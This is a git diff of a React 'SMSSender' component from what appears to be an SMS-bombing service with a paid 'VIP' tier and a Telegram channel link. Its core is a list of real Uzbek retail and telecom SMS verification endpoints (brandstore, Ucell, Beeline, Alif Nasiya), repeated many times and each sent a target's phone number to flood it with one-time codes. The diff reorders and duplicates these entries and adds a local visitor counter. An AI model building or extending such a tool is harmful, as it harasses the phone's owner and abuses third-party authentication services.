@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from "react";
 import { Send, AlertCircle, CheckCircle2, Timer, XCircle } from "lucide-react";
-import { useNavigate } from 'react-router-dom';
+import { useNavigate } from "react-router-dom";
 import "../styles/App.css";
 
 // Helper function to handle API requests with timeout
@@ -40,8 +40,10 @@ function SMSSender() {
   const [showStats, setShowStats] = useState(false);
   const [cooldown, setCooldown] = useState(0);
 
-  const lastSentTime = localStorage.getItem('lastSentTime');
-  const [lastSent, setLastSent] = useState(lastSentTime ? new Date(lastSentTime) : null);
+  const lastSentTime = localStorage.getItem("lastSentTime");
+  const [lastSent, setLastSent] = useState(
+    lastSentTime ? new Date(lastSentTime) : null
+  );
 
   useEffect(() => {
     let interval;
@@ -89,8 +91,7 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-  
-  
+
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -99,25 +100,7 @@ function SMSSender() {
         url: "https://market.beeline.uz/api/web/auth/login",
         body: { phone: `+${phone}` },
       },
-  
-      {
-        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
-        body: { phone },
-      },
-      {
-        url: "https://api.brandstore.uz/api/auth/code/create",
-        body: { phone },
-      },
-  
-  
+
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -134,7 +117,7 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-  
+
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -151,7 +134,7 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-  
+
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -160,7 +143,24 @@ function SMSSender() {
         url: "https://market.beeline.uz/api/web/auth/login",
         body: { phone: `+${phone}` },
       },
-      
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+
       {
         url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
         body: { phone },
@@ -181,7 +181,7 @@ function SMSSender() {
     setSuccessCount(successResults.length);
     setFailCount(failResults.length);
     setLastSent(new Date());
-    localStorage.setItem('lastSentTime', new Date().toISOString());
+    localStorage.setItem("lastSentTime", new Date().toISOString());
     setCooldown(50); // 50 second cooldown
     setLoading(false);
   };
@@ -197,7 +197,7 @@ function SMSSender() {
   const navigate = useNavigate(); // Sahifaga o'tish uchun hook
 
   const goToVipPage = () => {
-    navigate('/Vip-Page'); // "/Vip" sahifasiga o'tish
+    navigate("/Vip-Page"); // "/Vip" sahifasiga o'tish
   };
 
   const handleAdminClick = () => {
@@ -212,6 +212,25 @@ function SMSSender() {
       }
     }
   }, [lastSent]);
+
+  // prasmotr
+  const [visitors, setVisitors] = useState(0);
+
+  useEffect(() => {
+    const currentMonth = new Date().getMonth();
+    const savedMonth = localStorage.getItem("visitorMonth");
+    let count = localStorage.getItem("visitorCount");
+
+    if (savedMonth === null || parseInt(savedMonth) !== currentMonth) {
+      localStorage.setItem("visitorCount", 1);
+      localStorage.setItem("visitorMonth", currentMonth);
+      setVisitors(1);
+    } else {
+      count = count ? parseInt(count) + 1 : 1;
+      localStorage.setItem("visitorCount", count);
+      setVisitors(count);
+    }
+  }, []);
 
   return (
     <div className="container">
@@ -237,6 +256,8 @@ function SMSSender() {
             </span>
           )}
         </div>
+
+        <div className="pm">1 oylik tashrif buyurishlar: {visitors}  👀</div>
 
         {showStats && (
           <div className="stats-container">
@@ -279,7 +300,9 @@ function SMSSender() {
         <button className="button vip-button" onClick={goToVipPage}>
           VIP TARIFGA O'TISH💎
         </button>
-        <button className="button vip-button" onClick={handleAdminClick}>Telegram kanal🌐</button>
+        <button className="button vip-button" onClick={handleAdminClick}>
+          Telegram kanal🌐
+        </button>
       </div>
     </div>
   );
